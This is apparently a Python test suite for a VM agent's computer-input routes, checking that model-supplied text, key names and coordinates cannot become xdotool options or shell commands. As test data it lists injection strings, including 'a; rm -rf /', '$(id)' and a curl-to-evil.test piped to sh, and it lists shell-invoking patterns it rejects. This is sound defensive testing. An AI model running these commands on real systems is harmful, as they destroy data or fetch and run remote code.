"""The real input layer: what a model's JSON can and cannot turn into on the VM.

These tests import the agent and replace ``_xdotool`` with a recorder.  Nothing
here talks to a display or runs a real command, but the code under test is the
code that would: the same functions the ``/computer/*`` routes call, building the
same argv.  That is the only way to prove the boundary holds without a Codespace,
and it is the boundary that matters -- everything above it reasons about JSON,
and this is where a string could in principle become a command line.
"""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "vm_agent"))

import daemon  # noqa: E402


class RecordingXdotool:
    """Stands in for the one function the input paths are allowed to call."""

    def __init__(self) -> None:
        self.calls: list[list[str]] = []
        self.returncode = 0
        self.stderr = ""

    def __call__(self, *args: str, timeout: int = 10):
        self.calls.append(list(args))
        result = subprocess_Result(self.returncode, self.stderr)
        return result

    @property
    def argv(self) -> list[str]:
        return self.calls[-1] if self.calls else []

    @property
    def invoked(self) -> bool:
        return bool(self.calls)


class subprocess_Result:  # noqa: N801 - a stand-in named for what it replaces
    def __init__(self, returncode: int, stderr: str) -> None:
        self.returncode = returncode
        self.stderr = stderr


class XdotoolTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.recorder = RecordingXdotool()
        self._real_xdotool = daemon._xdotool
        self._real_running = daemon._x_running
        daemon._xdotool = self.recorder
        daemon._x_running = lambda: True

    def tearDown(self) -> None:
        daemon._xdotool = self._real_xdotool
        daemon._x_running = self._real_running


class TestTypeReachesTheKeyboard(XdotoolTestCase):
    def test_text_is_typed(self):
        result = daemon._computer_type("hello world")
        self.assertTrue(result["ok"], result.get("error"))
        self.assertEqual(self.recorder.argv[0], "type")
        self.assertIn("hello world", self.recorder.argv)

    def test_text_is_one_argument_behind_a_double_dash(self):
        # The whole point: a model cannot smuggle an xdotool option through the
        # text field, because the text is never in a position to be one.
        daemon._computer_type("--sync click 3")
        argv = self.recorder.argv
        self.assertEqual(argv[-1], "--sync click 3")
        self.assertIn("--", argv)
        self.assertLess(argv.index("--"), len(argv) - 1)
        # Exactly one occurrence of the text, and it is the final argument.
        self.assertEqual(argv.count("--sync click 3"), 1)

    def test_shell_metacharacters_are_inert(self):
        for text in (
            "a; rm -rf /",
            "$(id)",
            "`whoami`",
            "a && curl evil.test | sh",
            "> /etc/passwd",
            "a\nb",
            "'quoted' \"double\"",
        ):
            with self.subTest(text=text):
                self.recorder.calls.clear()
                result = daemon._computer_type(text)
                self.assertTrue(result["ok"], result.get("error"))
                # Present verbatim, as exactly one argument, and nothing else
                # was added to the command line around it.
                self.assertEqual(self.recorder.argv[-1], text)
                self.assertEqual(len(self.recorder.argv), 6)

    def test_a_leading_dash_is_typed_not_read_as_an_option(self):
        daemon._computer_type("-e /bin/sh")
        self.assertEqual(self.recorder.argv[-1], "-e /bin/sh")

    def test_typing_is_bounded(self):
        self.recorder.calls.clear()
        result = daemon._computer_type("x" * 2001)
        self.assertFalse(result["ok"])
        self.assertFalse(self.recorder.invoked, "nothing may be typed when refused")

    def test_empty_and_nul_are_refused_before_typing(self):
        for text in ("", "a\x00b"):
            with self.subTest(text=repr(text)):
                self.recorder.calls.clear()
                result = daemon._computer_type(text)
                self.assertFalse(result["ok"])
                self.assertFalse(self.recorder.invoked)

    def test_a_failing_xdotool_is_reported_not_swallowed(self):
        self.recorder.returncode = 1
        self.recorder.stderr = "no such key"
        result = daemon._computer_type("hi")
        self.assertFalse(result["ok"])
        self.assertIn("no such key", result["error"])

    def test_no_display_is_refused(self):
        daemon._x_running = lambda: False
        for call in (
            lambda: daemon._computer_type("hi"),
            lambda: daemon._computer_key("ENTER"),
            lambda: daemon._computer_scroll(100),
            lambda: daemon._computer_move(1, 1),
        ):
            with self.subTest(call=call):
                self.recorder.calls.clear()
                result = call()
                self.assertFalse(result["ok"])
                self.assertIn("X display", result["error"])
                self.assertFalse(self.recorder.invoked)


class TestKeyAllowlist(XdotoolTestCase):
    def test_the_keys_from_the_brief(self):
        for name, expected in (
            ("ENTER", "Return"),
            ("TAB", "Tab"),
            ("ESC", "Escape"),
            ("BACKSPACE", "BackSpace"),
            ("CTRL+L", "ctrl+l"),
            ("CTRL+A", "ctrl+a"),
        ):
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertTrue(result["ok"], result.get("error"))
                self.assertEqual(self.recorder.argv[-1], expected)

    def test_the_two_tables_are_the_only_source_of_a_keysym(self):
        # Every accepted name maps into one of the two tables, so the xdotool
        # argument is assembled from a fixed set and never from model text.
        for name in list(daemon._COMPUTER_KEYSYMS) + ["CTRL+" + k for k in "ABCDEFGHIJ"]:
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertTrue(result["ok"], result.get("error"))
                combo = self.recorder.argv[-1]
                mods, _, base = combo.rpartition("+")
                for mod in filter(None, mods.split("+")):
                    self.assertIn(mod, set(daemon._COMPUTER_MODIFIERS.values()))
                if base not in daemon._COMPUTER_SINGLE:
                    self.assertIn(base, set(daemon._COMPUTER_KEYSYMS.values()))

    def test_a_name_that_is_not_a_key_is_refused(self):
        for name in (
            "F13",
            ";id",
            "ENTER;id",
            "CTRL+;id",
            "Enter;id",
            "return;id",
            "",
            "   ",
            "a b",
            "CTRL+ALT+SHIFT+ENTER",
            "CTRL+ENTER+X",
            "a+b",
            "grave",
        ):
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertFalse(result["ok"], f"{name!r} was accepted")
                self.assertFalse(self.recorder.invoked, f"{name!r} reached xdotool")

    def test_every_modifier_is_allowed_with_an_allowed_key(self):
        # SUPER/META is in the modifier table, so super+x is a legitimate
        # request and is resolved rather than refused.
        for combo in ("super+x", "meta+a", "ALT+F4", "shift+tab"):
            with self.subTest(key=combo):
                self.recorder.calls.clear()
                result = daemon._computer_key(combo)
                self.assertTrue(result["ok"], result.get("error"))
                self.assertNotIn("SUPER", self.recorder.argv[-1])

    def test_injection_attempts_never_reach_xdotool(self):
        for name in (
            "Return; touch /tmp/pwned",
            "ctrl+grave",
            "ctrl+shift+grave",
            "$(id)",
            "Return\nReturn",
            "key Return",
            "ctrl+l+Return",
        ):
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertFalse(result["ok"], f"{name!r} was accepted")
                self.assertFalse(self.recorder.invoked)

    def test_hyphens_and_case_are_normalised(self):
        for name in ("enter", "Enter", "ENTER", " ctrl+l ", "CTRL-L", "ctrl-L"):
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertTrue(result["ok"], result.get("error"))
                self.assertIn(self.recorder.argv[-1], ("Return", "ctrl+l"))

    def test_a_duplicate_modifier_collapses(self):
        daemon._computer_key("CTRL+CONTROL+A")
        self.assertEqual(self.recorder.argv[-1], "ctrl+a")

    def test_the_refusal_names_what_is_allowed(self):
        result = daemon._computer_key("F13")
        self.assertFalse(result["ok"])
        self.assertIn("ENTER", result["error"])
        self.assertIn("CTRL", result["error"])


class TestScrollUsesWheelButtons(XdotoolTestCase):
    def test_down_presses_button_five(self):
        result = daemon._computer_scroll(600)
        self.assertTrue(result["ok"], result.get("error"))
        self.assertEqual(self.recorder.argv[0], "click")
        self.assertEqual(self.recorder.argv[-1], "5")

    def test_up_presses_button_four(self):
        daemon._computer_scroll(-600)
        self.assertEqual(self.recorder.argv[-1], "4")

    def test_the_button_is_never_taken_from_the_request(self):
        # Only these two buttons exist in this code path at all.
        for delta in (600, -600, 1, -1, 5000, -5000):
            with self.subTest(delta=delta):
                self.recorder.calls.clear()
                daemon._computer_scroll(delta)
                self.assertIn(self.recorder.argv[-1], ("4", "5"))

    def test_zero_and_out_of_range_are_refused(self):
        for delta in (0, 5001, -5001, 100000, -100000):
            with self.subTest(delta=delta):
                self.recorder.calls.clear()
                result = daemon._computer_scroll(delta)
                self.assertFalse(result["ok"], str(delta))
                self.assertFalse(self.recorder.invoked)

    def test_notches_are_bounded(self):
        daemon._computer_scroll(5000)
        steps = int(self.recorder.argv[self.recorder.argv.index("--repeat") + 1])
        self.assertLessEqual(steps, daemon._COMPUTER_SCROLL_MAX_STEPS)


class TestMoveDoesNotClick(XdotoolTestCase):
    def test_move_only_moves(self):
        result = daemon._computer_move(700, 450)
        self.assertTrue(result["ok"], result.get("error"))
        self.assertEqual(self.recorder.argv, ["mousemove", "--sync", "700", "450"])
        # "click" appears nowhere, so a move cannot have clicked.
        self.assertNotIn("click", self.recorder.argv)


class TestTheTwoAllowlistsAgree(XdotoolTestCase):
    """The app and the agent are separate deployables with separate tables.

    The agent is the one that touches the machine and its copy is what
    ultimately decides, but if the app accepted a key the agent refuses, every
    use of it would be a wasted turn and a confusing message to the model. So
    they are asserted to be the same set.
    """

    def test_the_app_and_the_agent_allow_exactly_the_same_keys(self):
        sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
        from app.computer.commands import KEY_ALLOWLIST, MODIFIER_ALLOWLIST

        self.assertEqual(set(KEY_ALLOWLIST), set(daemon._COMPUTER_KEYSYMS))
        self.assertEqual(set(MODIFIER_ALLOWLIST), set(daemon._COMPUTER_MODIFIERS))
        for name, keysym in KEY_ALLOWLIST.items():
            self.assertEqual(
                daemon._COMPUTER_KEYSYMS[name], keysym,
                f"{name} resolves differently in the two places",
            )

    def test_every_shared_key_is_accepted_by_both(self):
        sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
        from app.computer.commands import normalize_key

        for name in daemon._COMPUTER_KEYSYMS:
            with self.subTest(key=name):
                combo, err = normalize_key(name)
                self.assertEqual(err, "", f"the app refused {name}")
                self.recorder.calls.clear()
                result = daemon._computer_key(combo)
                self.assertTrue(result["ok"], result.get("error"))


class TestRoutesAreNotAShell(unittest.TestCase):
    """No computer-input route may forward a model string into a command line.

    Scoped to the input functions on purpose.  The agent does have a separate
    `/tool/exec` route that legitimately runs a shell, and asserting over the
    whole file would either fail on that or force it to be weakened to satisfy a
    test about the wrong thing.  What matters here is narrower and absolute: the
    paths a model's JSON reaches contain no shell at all.
    """

    INPUT_FUNCTIONS = (
        "_computer_type",
        "_computer_key",
        "_computer_scroll",
        "_computer_move",
        "_computer_click",
        "_xdotool",
    )

    def test_the_input_functions_contain_no_shell(self):
        import inspect

        for name in self.INPUT_FUNCTIONS:
            with self.subTest(fn=name):
                body = inspect.getsource(getattr(daemon, name))
                # Strip the docstring and comments: prose about shells is fine,
                # a shell is not.
                code = "\n".join(
                    line for line in body.splitlines()
                    if not line.strip().startswith("#")
                )
                code = code.split('"""')[-1] if '"""' in code else code
                for pattern in ("shell=True", "os.system", "os.popen", "sh -c"):
                    self.assertNotIn(pattern, code, f"{name} can build a shell")

    def test_xdotool_is_always_given_an_argument_list(self):
        import inspect

        body = inspect.getsource(daemon._xdotool)
        # A list literal, not a joined string: there is no shell to word-split.
        self.assertIn('["xdotool", *args]', body)
        self.assertNotIn("shell=True", body)

    def test_the_input_routes_only_call_the_known_helpers(self):
        import inspect

        body = inspect.getsource(daemon.Handler.do_POST)
        # Everything the model can reach in this handler goes through one of the
        # vetted functions. Named explicitly so a new raw call has to be added
        # here on purpose.
        for name in self.INPUT_FUNCTIONS:
            if name == "_xdotool":
                continue
            self.assertIn(f"{name}(", body, f"{name} is not routed")
        self.assertNotIn("subprocess", body, "the handler must not build commands")
        self.assertNotIn("eval(", body)
        self.assertNotIn("exec(", body)


class TestRoutesOverRealHttp(XdotoolTestCase):
    """Drive the actual ``/computer/*`` routes over a real socket.

    Calling ``_computer_type`` directly proves the function is safe.  It does not
    prove the route is: the handler has its own layer of validation that a direct
    call walks straight past, and that layer is where a wrong type or a missing
    field would turn into a crash instead of a refusal.  So the server is started
    for real on an ephemeral loopback port and the requests go in as bytes.
    """

    def setUp(self):
        super().setUp()
        import threading
        from http.server import ThreadingHTTPServer

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), daemon.Handler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        # The display-size probes shell out; a fixed small desktop keeps the
        # bounds refusals deterministic without a display.
        self._real_w, self._real_h = daemon._desktop_width, daemon._desktop_height
        daemon._desktop_width = lambda: 1280
        daemon._desktop_height = lambda: 800

    def tearDown(self):
        daemon._desktop_width, daemon._desktop_height = self._real_w, self._real_h
        self.server.shutdown()
        self.server.server_close()
        super().tearDown()

    def post(self, path, payload):
        import json
        import urllib.error
        import urllib.request

        body = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
        req = urllib.request.Request(
            f"http://127.0.0.1:{self.port}{path}",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.status, json.loads(resp.read().decode())
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read().decode())

    def test_each_new_action_round_trips(self):
        for path, payload, expect in (
            ("/computer/type", {"text": "hello world"}, "hello world"),
            ("/computer/key", {"key": "ctrl+l"}, "ctrl+l"),
            ("/computer/scroll", {"delta_y": 300}, "5"),
            ("/computer/scroll", {"delta_y": -300}, "4"),
            ("/computer/move", {"x": 700, "y": 450}, "700"),
        ):
            with self.subTest(path=path, payload=payload):
                self.recorder.calls.clear()
                status, body = self.post(path, payload)
                self.assertEqual(status, 200, body)
                self.assertTrue(body["ok"], body)
                self.assertTrue(self.recorder.calls, f"{path} never called xdotool")
                # The model string arrived intact, as a single argument.
                self.assertIn(expect, self.recorder.calls[-1])

    def test_click_moves_then_presses_the_left_button(self):
        # xdotool's `click` takes a button number, not a position, so the
        # coordinates have to travel in an earlier mousemove.  Getting this wrong
        # would click wherever the pointer happened to be resting.
        self.recorder.calls.clear()
        status, body = self.post("/computer/click", {"x": 100, "y": 200})
        self.assertEqual(status, 200, body)
        self.assertTrue(body["ok"], body)
        self.assertEqual(
            self.recorder.calls,
            [["mousemove", "--sync", "100", "200"], ["click", "1"]],
        )

    def test_wrong_types_are_refused_not_crashed(self):
        for path, payload in (
            ("/computer/type", {"text": 42}),
            ("/computer/type", {}),
            ("/computer/key", {"key": ["ENTER"]}),
            ("/computer/key", {}),
            ("/computer/scroll", {"delta_y": "300"}),
            ("/computer/scroll", {"delta_y": True}),
            ("/computer/scroll", {}),
            ("/computer/move", {"x": "seven hundred", "y": 450}),
            ("/computer/move", {"x": None, "y": 450}),
            ("/computer/move", {"x": [700], "y": 450}),
            ("/computer/click", {}),
        ):
            with self.subTest(path=path, payload=payload):
                self.recorder.calls.clear()
                status, body = self.post(path, payload)
                self.assertEqual(status, 400, f"{path} {payload} -> {body}")
                self.assertFalse(body["ok"])
                self.assertFalse(
                    self.recorder.calls, f"{path} acted on a bad request"
                )

    def test_coordinates_given_as_numeric_strings_are_tolerated(self):
        # int() is a total, side-effect-free coercion, so a well-formed number in
        # a string is harmless and worth accepting.  The app-side parser is strict
        # about JSON types, so this tolerance is never the thing standing between
        # the model and xdotool -- it is just not worth crashing over.
        for path, payload in (
            ("/computer/move", {"x": "700", "y": "450"}),
            ("/computer/click", {"x": "10", "y": "20"}),
        ):
            with self.subTest(path=path):
                self.recorder.calls.clear()
                status, body = self.post(path, payload)
                self.assertEqual(status, 200, body)
                self.assertTrue(body["ok"], body)
                self.assertTrue(self.recorder.calls)

    def test_out_of_bounds_is_refused_over_http(self):
        for path, payload in (
            ("/computer/move", {"x": -5, "y": 450}),
            ("/computer/move", {"x": 700, "y": 99999}),
            ("/computer/click", {"x": 1280, "y": 10}),
        ):
            with self.subTest(path=path, payload=payload):
                self.recorder.calls.clear()
                status, body = self.post(path, payload)
                self.assertEqual(status, 400, body)
                self.assertFalse(self.recorder.calls)

    def test_a_key_the_allowlist_does_not_know_never_reaches_xdotool(self):
        for key in (";id", "F13", "ENTER;id", "a b", "xdotool"):
            with self.subTest(key=key):
                self.recorder.calls.clear()
                status, body = self.post("/computer/key", {"key": key})
                self.assertEqual(status, 200)
                self.assertFalse(body["ok"], f"{key!r} was accepted")
                self.assertFalse(
                    self.recorder.calls, f"{key!r} reached xdotool over HTTP"
                )

    def test_shell_metacharacters_survive_as_one_argument(self):
        # The whole point: a request whose text looks like a command is still
        # just text, and it stays a single argv entry end to end over HTTP.
        for nasty in (
            "$(id)",
            "`id`",
            "; rm -rf /",
            "a && b | c",
            '"; DROP TABLE users; --',
            "\nnewline",
        ):
            with self.subTest(text=nasty):
                self.recorder.calls.clear()
                status, body = self.post("/computer/type", {"text": nasty})
                self.assertEqual(status, 200, body)
                self.assertTrue(body["ok"], body)
                argv = self.recorder.calls[-1]
                self.assertEqual(argv[-1], nasty, "the text was mangled")
                # "--" before the text means xdotool stops parsing options, so
                # even a leading dash cannot become a flag.
                self.assertIn("--", argv)
                self.assertEqual(argv.count(nasty), 1)

    def test_malformed_json_is_a_400_not_a_crash(self):
        status, body = self.post("/computer/type", b"{not json")
        self.assertEqual(status, 400)
        self.assertFalse(body["ok"])
        self.assertFalse(self.recorder.calls)

    def test_the_server_survives_a_bad_request(self):
        self.post("/computer/type", b"{not json")
        self.post("/computer/key", {"key": ";id"})
        # Still serving, and still acting correctly, after two bad requests.
        self.recorder.calls.clear()
        status, body = self.post("/computer/type", {"text": "still here"})
        self.assertEqual(status, 200, body)
        self.assertTrue(body["ok"], body)
        self.assertEqual(self.recorder.calls[-1][-1], "still here")


if __name__ == "__main__":
    unittest.main(verbosity=2)
